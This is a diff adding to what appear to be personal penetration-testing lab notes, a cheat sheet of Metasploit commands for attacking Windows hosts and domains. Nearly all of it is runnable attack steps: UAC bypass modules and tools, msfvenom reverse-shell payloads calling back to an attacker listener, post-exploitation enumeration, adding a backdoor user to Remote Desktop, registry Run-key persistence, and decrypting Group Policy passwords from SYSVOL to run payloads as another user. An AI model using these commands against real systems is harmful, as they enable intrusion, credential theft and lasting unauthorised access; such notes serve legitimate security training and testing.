@@ -118,19 +118,40 @@ meterpreter> whoami // find out who we are after impersonating token
 
 meterpreter> run post/windows/gather/win_privs // find out admin privs, UAC en/disabled
 search in metasploit > search uac
-meterpreter> use exploit/windows/local/bypassuac_injection // set session id to the target meterpreter session
+meterpreter> use exploit/windows/local/bypassuac
+meterpreter> use exploit/windows/local/bypassuac_injection // set session id to )the target meterpreter session
 
 Manually you can download UACME from github en upload the UAC exploit in the meterpreter session.
 akagi64.exe 10 c:\users\els\downloads\exploit.exe // runs the exploit backdoor with the UAC bypass tool using option 10
+
+ESCALATE TO SYSTEM - MANUALLY
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tap0IP LPORT=4700 -f exe --platform Windows > shell.exe
+locate bypassuac (choose x86 or x64)
+upload both in the meterpreter session
+
+create handler
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST
+set LPORT
+exploit -j // run as background
+
+go back to meterpreter
+shell
+bypassuac-x64.exe /c c:\users\els\dekstop\shell.exe
 
 PILAGING
 meterpreter> sysinfo // gathering information about OS en  Architecture (x86/x64 <-- important for payload en compiling) 
 meterpreter> getuid // check user we are currently running on target machine
 meterpreter> run post/windows/gather/enum_services // get list of services on remote machine
 meterpreter> run post/windows/gather/enum_ad_users // list users from domain
+meterpreter> run post/windows/gather/enum_computers // list computers from domain
+meterpreter> run post/windows/gather/win_privs // shows all the privileges current user
 meterpreter> run enum_shares // list shares
 meterpreter> run winenum // save all information into local files to inspect them later
 meterpreter> run post/windows/gather/enum_applications // list installed applications
+meterpreter> run arp_scanner -r subnet // scan the internal network
+meterpreter>  run post/windows/gather/enum_application // enumerate installed applications
 
 after running shell in a meterpreter session we can use following commands (windows commands)
 wmic service get caption,startname,stat,pathname // list services
@@ -138,6 +159,10 @@ net start // list started services
 net view /domain // viewing the domain
 net group "Domain Controllers" /domain // list the domain controllers
 net user // list users
+net user username userpwd /add // add a user
+net localgroup "Remote Desktop Users" username /add // add user to rdp
+meterpreter> run getgui -e // enabling rdp on host
+rdesktop ip -u username
 
 
 for linux commands we can use the following
@@ -181,3 +206,49 @@ msf> use exploit/multi/handler // start listener with same options as above (sam
 MAINTAINING ACCESS
 
 reg setval  - k  HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
+
+PAYLOAD
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tap0IP LPORT=5555 -f exe > shell.exe
+
+
+set // finding out domain info
+meterpreter> load extapi
+adsi_computer_enum domain.com
+adsi_user_enum domain.com
+%LOGONSERVER%\Sysvol
+drop into shell from meterpreter> shell
+net use x: \\dc01\SysVol
+x:
+
+search for groups.xml
+
+type x:\domain.com\policies\numberstring\machine\prefereces\groups\groups.xml
+find passowrd / username and groupname administrator actions=ADD
+
+use gpp-decrypt for password decryption (within kali)
+
+from a NON-DOMAIN joined computer
+use payload/windows/meterpreter/reverse_tcp
+set LHOST tap0IP
+set LPORT 11112
+meterpreter> generate -f msfadexploit.exe - t exe
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LPORT 11112
+set LHOST tap0IP
+exploit -j 
+
+upload msfadexploit.com
+shell
+icacls msfadexploit.exe /grant Everyone:(F)
+
+use post/windows/manage/run_as
+set CMD
+c:\\users\\auser\\msfadexploit.exe
+set user foundinpolicy
+set password decryptedfromkali
+set session x
+set DOMAIN domain.com
+exploit
+
